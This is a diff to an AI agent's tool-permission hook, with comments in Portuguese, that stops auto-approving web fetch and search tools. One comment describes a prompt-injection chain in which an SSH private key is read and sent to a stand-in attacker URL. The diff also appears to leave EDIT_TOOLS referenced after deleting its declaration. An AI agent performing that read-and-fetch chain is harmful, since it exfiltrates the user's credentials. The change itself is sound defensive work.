@@ -36,6 +36,9 @@
 //     {"type":"turn_done"} | {"type":"error"|"warn","message"}
 
 import * as readline from "node:readline";
+// A política de permissão (cerca de leitura, rede e destrutivo) mora em módulo próprio —
+// é a única forma de ela ter teste, já que este arquivo roda ao ser importado (F-13/F-29).
+import { PATH_ARG, decidir } from "./politica.mjs";
 
 // ---------------------------------------------------------------- saída NDJSON
 function emit(obj) {
@@ -125,12 +128,18 @@ if (process.env.ANTHROPIC_API_KEY) {
 const pendingGates = new Map();
 
 // Leitura = auto (espelha a política do Modo Code: leitura não pede aprovação).
+//
+// 🔴 `WebFetch` e `WebSearch` SAÍRAM daqui em 02/09/2026 (achado F-13 da revisão de 01/09).
+// Eles não são leitura: são **saída para a rede**, e é a metade que fecha a cadeia. Com
+// `Read` de qualquer caminho e `WebFetch` para qualquer URL, ambos automáticos, uma injeção
+// de prompt num arquivo do projeto compunha `Read ~/.ssh/id_rsa` → `WebFetch
+// https://atacante/?d=…` **sem um único cartão de aprovação**. O `anna`, o outro motor desta
+// mesma casca, mantém `curl` e `wget` fora do automático justamente por isso — e o comentário
+// deste arquivo diz, com todas as letras, que "um motor não pode ser a porta dos fundos do
+// outro". Era.
 const READ_ONLY_TOOLS = new Set([
-  "Read", "Glob", "Grep", "LS", "NotebookRead", "WebFetch", "WebSearch", "TodoWrite",
+  "Read", "Glob", "Grep", "LS", "NotebookRead", "TodoWrite",
 ]);
-
-/** Ferramentas que ESCREVEM arquivo — o degrau que o nível `edit` libera. */
-const EDIT_TOOLS = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
 
 /**
  * Nível de aprovação, espelhando os três do `anna` — **de propósito**.
@@ -204,25 +213,31 @@ async function preToolUse(input /* PreToolUseHookInput */) {
   const toolInput = input?.tool_input ?? {};
   const id = input?.tool_use_id ?? "";
 
-  if (READ_ONLY_TOOLS.has(toolName)) {
-    return allowDecision("leitura (auto)");
-  }
-
-  // Níveis acima de `manual` liberam sem perguntar — e a fronteira é a MESMA do
-  // `anna`: `edit` libera escrita de arquivo; `auto` libera também comando.
+  // Um único ponto de decisão, e ele é testável: `politica.mjs`. A ordem lá é cerca ANTES
+  // de atalho — leitura só é automática dentro da pasta e fora da denylist de segredos;
+  // saída para a rede e comando destrutivo sempre pedem cartão, em qualquer nível.
   //
-  // ⚠️ O que NENHUM nível libera é o que sai da pasta do projeto. O `cwd` do
-  // SDK confina as ferramentas de arquivo; para `Bash` o comando é livre, então
-  // `auto` aqui é "não pergunta por comando", não "pode qualquer coisa". Se um
-  // dia isso precisar de cerca própria, o lugar é aqui — e a cerca vem antes do
-  // atalho, nunca depois.
-  if (APROVACAO !== "manual" && EDIT_TOOLS.has(toolName)) {
-    return allowDecision(`edição liberada pelo nível "${APROVACAO}"`);
+  // ⚠️ A frase que estava aqui — "o que NENHUM nível libera é o que sai da pasta do
+  // projeto" — descrevia uma cerca que **não existia**: `Read` de caminho absoluto e
+  // `WebFetch` de qualquer URL eram automáticos, e os dois juntos são a cadeia de
+  // exfiltração inteira (F-13). Agora a frase é verdade, e tem teste.
+  const { acao, motivo } = decidir({
+    projectDir: PROJECT_DIR,
+    toolName,
+    toolInput,
+    nivel: APROVACAO,
+    leitura: READ_ONLY_TOOLS,
+    edicao: EDIT_TOOLS,
+  });
+  if (acao === "allow") {
+    return allowDecision(motivo);
   }
-  if (APROVACAO === "auto") {
-    return allowDecision('liberado pelo nível "auto"');
-  }
+  return gate(id, toolName, toolInput, motivo);
+}
 
+/** Emite o cartão e BLOQUEIA até o usuário decidir. `motivo` aparece no log do runner. */
+async function gate(id, toolName, toolInput, motivo) {
+  if (motivo) process.stderr.write(`[gate] ${toolName}: ${motivo}\n`);
   emit({
     type: "gate_request",
     id,
